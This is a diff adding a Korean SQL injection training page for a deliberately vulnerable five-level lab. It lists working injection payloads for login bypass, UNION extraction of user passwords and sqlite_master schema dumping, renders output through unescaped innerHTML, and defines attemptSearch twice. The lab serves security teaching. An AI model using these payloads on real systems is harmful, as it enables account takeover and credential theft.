@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection 단계별 학습</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            font-size: 1.1em;
+            opacity: 0.9;
+        }
+
+        .levels-container {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            min-height: 600px;
+        }
+
+        .sidebar {
+            background: #f8f9fa;
+            padding: 20px;
+            border-right: 1px solid #dee2e6;
+        }
+
+        .level-item {
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .level-item:hover {
+            background: #e9ecef;
+        }
+
+        .level-item.active {
+            background: #007bff;
+            color: white;
+            border-color: #0056b3;
+        }
+
+        .level-item.completed {
+            background: #28a745;
+            color: white;
+            border-color: #1e7e34;
+        }
+
+        .main-content {
+            padding: 30px;
+        }
+
+        .level-info {
+            margin-bottom: 30px;
+        }
+
+        .level-info h2 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 1.8em;
+        }
+
+        .level-info p {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .hint-box {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .hint-box h4 {
+            color: #856404;
+            margin-bottom: 10px;
+        }
+
+        .input-section {
+            background: #f8f9fa;
+            padding: 25px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+
+        .btn {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s ease;
+        }
+
+        .btn:hover {
+            background: #0056b3;
+        }
+
+        .btn-success {
+            background: #28a745;
+        }
+
+        .btn-success:hover {
+            background: #1e7e34;
+        }
+
+        .results {
+            background: white;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+
+        .results h3 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .result-item {
+            background: #f8f9fa;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            border-left: 4px solid #007bff;
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            border: 1px solid #c3e6cb;
+        }
+
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            border: 1px solid #f5c6cb;
+        }
+
+        .payload-examples {
+            background: #e9ecef;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+        }
+
+        .payload-examples h4 {
+            margin-bottom: 10px;
+            color: #495057;
+        }
+
+        .payload-example {
+            background: white;
+            padding: 8px 12px;
+            margin: 5px 0;
+            border-radius: 4px;
+            font-family: monospace;
+            cursor: pointer;
+            border: 1px solid #dee2e6;
+        }
+
+        .payload-example:hover {
+            background: #f8f9fa;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e9ecef;
+            border-radius: 4px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #28a745, #20c997);
+            transition: width 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+    <a href="/" class="back-btn" style="position: fixed; top: 20px; left: 20px; background: rgba(0,0,0,0.7); color: white; border: none; padding: 10px 15px; border-radius: 5px; cursor: pointer; text-decoration: none; font-size: 14px; z-index: 1000;">← 메인으로</a>
+
+    <div class="container">
+        <div class="header">
+            <h1>🔓 SQL Injection 단계별 학습</h1>
+            <p>의도적으로 취약한 환경에서 SQL Injection을 안전하게 학습하세요</p>
+        </div>
+
+        <div class="levels-container">
+            <div class="sidebar">
+                <h3 style="margin-bottom: 20px; color: #333;">📚 학습 단계</h3>
+                <div class="level-item active" data-level="1">
+                    <strong>Level 1:</strong> 기본 인증 우회
+                </div>
+                <div class="level-item" data-level="2">
+                    <strong>Level 2:</strong> 데이터 추출
+                </div>
+                <div class="level-item" data-level="3">
+                    <strong>Level 3:</strong> UNION 공격
+                </div>
+                <div class="level-item" data-level="4">
+                    <strong>Level 4:</strong> 고급 데이터 추출
+                </div>
+                <div class="level-item" data-level="5">
+                    <strong>Level 5:</strong> 데이터베이스 정보 수집
+                </div>
+                
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill" style="width: 20%;"></div>
+                </div>
+                <p style="text-align: center; color: #666; font-size: 0.9em;">
+                    진행률: <span id="progressText">1/5</span>
+                </p>
+            </div>
+
+            <div class="main-content">
+                <div class="level-info">
+                    <h2 id="levelTitle">Level 1: 기본 인증 우회</h2>
+                    <p id="levelDescription">
+                        첫 번째 단계에서는 기본적인 SQL Injection을 통해 로그인 인증을 우회해보겠습니다.
+                        사용자명과 비밀번호 입력 필드에 SQL Injection 페이로드를 입력하여 관리자 계정으로 로그인해보세요.
+                    </p>
+                    
+                    <div class="hint-box">
+                        <h4>💡 힌트</h4>
+                        <p id="levelHint">
+                            사용자명 필드에 <code>' OR '1'='1</code> 또는 <code>' OR 1=1 --</code>를 입력해보세요.
+                            이는 WHERE 절을 항상 참으로 만들어 모든 사용자를 반환하게 합니다.
+                        </p>
+                    </div>
+                </div>
+
+                <div class="input-section">
+                    <div class="input-group">
+                        <label for="username">사용자명:</label>
+                        <input type="text" id="username" placeholder="사용자명을 입력하세요">
+                    </div>
+                    <div class="input-group">
+                        <label for="password">비밀번호:</label>
+                        <input type="text" id="password" placeholder="비밀번호를 입력하세요">
+                    </div>
+                    <button class="btn" onclick="attemptLogin()">로그인 시도</button>
+                </div>
+
+                <div class="payload-examples">
+                    <h4>🎯 페이로드 예시 (클릭하여 복사)</h4>
+                    <div class="payload-example" onclick="copyPayload(this)">' OR '1'='1</div>
+                    <div class="payload-example" onclick="copyPayload(this)">' OR 1=1 --</div>
+                    <div class="payload-example" onclick="copyPayload(this)">admin' --</div>
+                    <div class="payload-example" onclick="copyPayload(this)">' UNION SELECT * FROM users --</div>
+                </div>
+
+                <div id="results" class="results" style="display: none;">
+                    <h3>📊 결과</h3>
+                    <div id="resultContent"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentLevel = 1;
+        let completedLevels = new Set();
+
+        const levels = {
+            1: {
+                title: "Level 1: 기본 인증 우회",
+                description: "첫 번째 단계에서는 기본적인 SQL Injection을 통해 로그인 인증을 우회해보겠습니다. 사용자명과 비밀번호 입력 필드에 SQL Injection 페이로드를 입력하여 관리자 계정으로 로그인해보세요.",
+                hint: "사용자명 필드에 <code>' OR '1'='1</code> 또는 <code>' OR 1=1 --</code>를 입력해보세요. 이는 WHERE 절을 항상 참으로 만들어 모든 사용자를 반환하게 합니다.",
+                inputType: "login",
+                payloads: ["' OR '1'='1", "' OR 1=1 --", "admin' --", "' OR '1'='1' --"]
+            },
+            2: {
+                title: "Level 2: 데이터 추출",
+                description: "이번 단계에서는 SQL Injection을 사용하여 데이터베이스에서 사용자 정보를 추출해보겠습니다. 검색 기능을 통해 모든 사용자의 정보를 찾아보세요.",
+                hint: "검색어에 <code>' UNION SELECT username, password, email FROM users --</code>를 입력해보세요. UNION을 사용하여 원래 쿼리와 다른 결과를 결합할 수 있습니다.",
+                inputType: "search",
+                payloads: ["' UNION SELECT username, password, email FROM users --", "' UNION SELECT * FROM users --", "' OR 1=1 UNION SELECT username, password, email FROM users --"]
+            },
+            3: {
+                title: "Level 3: UNION 공격",
+                description: "UNION 공격을 사용하여 데이터베이스의 다른 테이블에서 정보를 추출해보겠습니다. 게시글 테이블의 정보를 가져와보세요.",
+                hint: "검색어에 <code>' UNION SELECT title, content, author FROM posts --</code>를 입력해보세요. 다른 테이블의 데이터를 조회할 수 있습니다.",
+                inputType: "search",
+                payloads: ["' UNION SELECT title, content, author FROM posts --", "' UNION SELECT * FROM posts --", "' OR 1=1 UNION SELECT title, content, author FROM posts --"]
+            },
+            4: {
+                title: "Level 4: 고급 데이터 추출",
+                description: "더 복잡한 SQL Injection을 통해 특정 조건에 맞는 데이터를 추출해보겠습니다. 관리자 계정만 찾아보세요.",
+                hint: "검색어에 <code>' UNION SELECT id, username, password, email FROM users WHERE username LIKE '%admin%' --</code>를 입력해보세요. WHERE 절을 사용하여 특정 조건의 데이터만 추출할 수 있습니다.",
+                inputType: "search",
+                payloads: ["' UNION SELECT id, username, password, email FROM users WHERE username LIKE '%admin%' --", "' UNION SELECT * FROM users WHERE username LIKE '%admin%' --"]
+            },
+            5: {
+                title: "Level 5: 데이터베이스 정보 수집",
+                description: "마지막 단계에서는 데이터베이스의 메타데이터를 수집해보겠습니다. 시스템 테이블을 조회하여 데이터베이스 구조를 파악해보세요.",
+                hint: "검색어에 <code>' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --</code>를 입력해보세요. sqlite_master 테이블은 데이터베이스의 스키마 정보를 담고 있습니다.",
+                inputType: "search",
+                payloads: ["' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --", "' UNION SELECT * FROM sqlite_master --", "' OR 1=1 UNION SELECT name, sql FROM sqlite_master WHERE type='table' --"]
+            }
+        };
+
+        function loadLevel(level) {
+            currentLevel = level;
+            const levelData = levels[level];
+            
+            document.getElementById('levelTitle').innerHTML = levelData.title;
+            document.getElementById('levelDescription').innerHTML = levelData.description;
+            document.getElementById('levelHint').innerHTML = levelData.hint;
+            
+            // 입력 필드 업데이트
+            updateInputFields(levelData.inputType);
+            
+            // 페이로드 예시 업데이트
+            updatePayloadExamples(levelData.payloads);
+            
+            // UI 업데이트
+            document.querySelectorAll('.level-item').forEach(item => {
+                item.classList.remove('active');
+                if (parseInt(item.dataset.level) === level) {
+                    item.classList.add('active');
+                }
+            });
+            
+            updateProgress();
+            hideResults();
+        }
+
+        function updateInputFields(inputType) {
+            const inputSection = document.querySelector('.input-section');
+            
+            if (inputType === 'login') {
+                inputSection.innerHTML = `
+                    <div class="input-group">
+                        <label for="username">사용자명:</label>
+                        <input type="text" id="username" placeholder="사용자명을 입력하세요">
+                    </div>
+                    <div class="input-group">
+                        <label for="password">비밀번호:</label>
+                        <input type="text" id="password" placeholder="비밀번호를 입력하세요">
+                    </div>
+                    <button class="btn" onclick="attemptLogin()">로그인 시도</button>
+                `;
+            } else if (inputType === 'search') {
+                inputSection.innerHTML = `
+                    <div class="input-group">
+                        <label for="searchQuery">검색어:</label>
+                        <input type="text" id="searchQuery" placeholder="검색어를 입력하세요">
+                    </div>
+                    <button class="btn" onclick="attemptSearch()">검색</button>
+                `;
+            }
+            
+            // 이벤트 리스너 다시 추가
+            addEventListeners();
+        }
+
+        function updatePayloadExamples(payloads) {
+            const payloadContainer = document.querySelector('.payload-examples');
+            let payloadHTML = '<h4>🎯 페이로드 예시 (클릭하여 복사)</h4>';
+            
+            payloads.forEach(payload => {
+                payloadHTML += `<div class="payload-example" onclick="copyPayload(this)">${payload}</div>`;
+            });
+            
+            payloadContainer.innerHTML = payloadHTML;
+        }
+
+        function addEventListeners() {
+            // Enter 키 이벤트
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const searchInput = document.getElementById('searchQuery');
+            
+            if (usernameInput) {
+                usernameInput.addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter') {
+                        attemptLogin();
+                    }
+                });
+            }
+            
+            if (passwordInput) {
+                passwordInput.addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter') {
+                        attemptLogin();
+                    }
+                });
+            }
+            
+            if (searchInput) {
+                searchInput.addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter') {
+                        attemptSearch();
+                    }
+                });
+            }
+        }
+
+        function attemptLogin() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (currentLevel === 1) {
+                // Level 1: 실제 서버 API 호출
+                fetch('/sql-level1/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ username, password })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        showSuccess("🎉 성공! SQL Injection을 통해 인증을 우회했습니다!", 
+                                  `사용자명: ${username}<br>비밀번호: ${password}<br><br><strong>실행된 SQL:</strong><br><code>${data.sql}</code>`);
+                        completeLevel(1);
+                    } else {
+                        showError(`❌ 실패! 올바른 SQL Injection 페이로드를 사용해보세요.<br><br><strong>실행된 SQL:</strong><br><code>${data.sql}</code>`);
+                    }
+                })
+                .catch(error => {
+                    showError("❌ 오류가 발생했습니다: " + error.message);
+                });
+            } else {
+                // 다른 레벨들은 검색 기능 사용
+                attemptSearch(username);
+            }
+        }
+
+        function attemptSearch(query) {
+            if (!query.trim()) {
+                showError("❌ 검색어를 입력해주세요.");
+                return;
+            }
+
+            // 실제 서버 API 호출
+            const endpoint = `/sql-level${currentLevel}/search?q=${encodeURIComponent(query)}`;
+            
+            fetch(endpoint)
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    let resultData = "";
+                    
+                    if (data.results && data.results.length > 0) {
+                        data.results.forEach(result => {
+                            resultData += '<div class="result-item">';
+                            Object.keys(result).forEach(key => {
+                                resultData += `<strong>${key}:</strong> ${result[key]}<br>`;
+                            });
+                            resultData += '</div>';
+                        });
+                    } else {
+                        resultData = '<div class="result-item">검색 결과가 없습니다.</div>';
+                    }
+                    
+                    showSuccess(`🎉 성공! Level ${currentLevel}을 완료했습니다!`, 
+                              `<strong>실행된 SQL:</strong><br><code>${data.sql}</code><br><br><strong>결과:</strong>${resultData}`);
+                    completeLevel(currentLevel);
+                } else {
+                    showError(`❌ 실패! 올바른 SQL Injection 페이로드를 사용해보세요.<br><br><strong>실행된 SQL:</strong><br><code>${data.sql}</code>`);
+                }
+            })
+            .catch(error => {
+                showError("❌ 오류가 발생했습니다: " + error.message);
+            });
+        }
+
+        function attemptSearch() {
+            const searchQuery = document.getElementById('searchQuery').value;
+            if (!searchQuery.trim()) {
+                showError("❌ 검색어를 입력해주세요.");
+                return;
+            }
+
+            // 실제 서버 API 호출
+            const endpoint = `/sql-level${currentLevel}/search?q=${encodeURIComponent(searchQuery)}`;
+            
+            fetch(endpoint)
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    let resultData = "";
+                    
+                    if (data.results && data.results.length > 0) {
+                        data.results.forEach(result => {
+                            resultData += '<div class="result-item">';
+                            Object.keys(result).forEach(key => {
+                                resultData += `<strong>${key}:</strong> ${result[key]}<br>`;
+                            });
+                            resultData += '</div>';
+                        });
+                    } else {
+                        resultData = '<div class="result-item">검색 결과가 없습니다.</div>';
+                    }
+                    
+                    showSuccess(`🎉 성공! Level ${currentLevel}을 완료했습니다!`, 
+                              `<strong>실행된 SQL:</strong><br><code>${data.sql}</code><br><br><strong>결과:</strong>${resultData}`);
+                    completeLevel(currentLevel);
+                } else {
+                    showError(`❌ 실패! 올바른 SQL Injection 페이로드를 사용해보세요.<br><br><strong>실행된 SQL:</strong><br><code>${data.sql}</code>`);
+                }
+            })
+            .catch(error => {
+                showError("❌ 오류가 발생했습니다: " + error.message);
+            });
+        }
+
+        function completeLevel(level) {
+            completedLevels.add(level);
+            updateProgress();
+            
+            // 다음 레벨로 자동 이동
+            if (level < 5) {
+                setTimeout(() => {
+                    loadLevel(level + 1);
+                }, 2000);
+            }
+        }
+
+        function updateProgress() {
+            const progress = (completedLevels.size / 5) * 100;
+            document.getElementById('progressFill').style.width = progress + '%';
+            document.getElementById('progressText').textContent = `${completedLevels.size}/5`;
+            
+            // 완료된 레벨 표시
+            document.querySelectorAll('.level-item').forEach(item => {
+                const level = parseInt(item.dataset.level);
+                item.classList.remove('completed');
+                if (completedLevels.has(level)) {
+                    item.classList.add('completed');
+                }
+            });
+        }
+
+        function showSuccess(title, message) {
+            const resultsDiv = document.getElementById('results');
+            const resultContent = document.getElementById('resultContent');
+            
+            resultContent.innerHTML = `
+                <div class="success-message">
+                    <h4>${title}</h4>
+                    <p>${message}</p>
+                </div>
+            `;
+            
+            resultsDiv.style.display = 'block';
+        }
+
+        function showError(message) {
+            const resultsDiv = document.getElementById('results');
+            const resultContent = document.getElementById('resultContent');
+            
+            resultContent.innerHTML = `
+                <div class="error-message">
+                    <h4>${message}</h4>
+                </div>
+            `;
+            
+            resultsDiv.style.display = 'block';
+        }
+
+        function hideResults() {
+            document.getElementById('results').style.display = 'none';
+        }
+
+        function copyPayload(element) {
+            const text = element.textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                element.style.background = '#28a745';
+                element.style.color = 'white';
+                setTimeout(() => {
+                    element.style.background = 'white';
+                    element.style.color = 'black';
+                }, 500);
+            });
+        }
+
+        // 레벨 클릭 이벤트
+        document.querySelectorAll('.level-item').forEach(item => {
+            item.addEventListener('click', () => {
+                const level = parseInt(item.dataset.level);
+                loadLevel(level);
+            });
+        });
+
+        // 초기 로드
+        loadLevel(1);
+    </script>
+</body>
+</html>
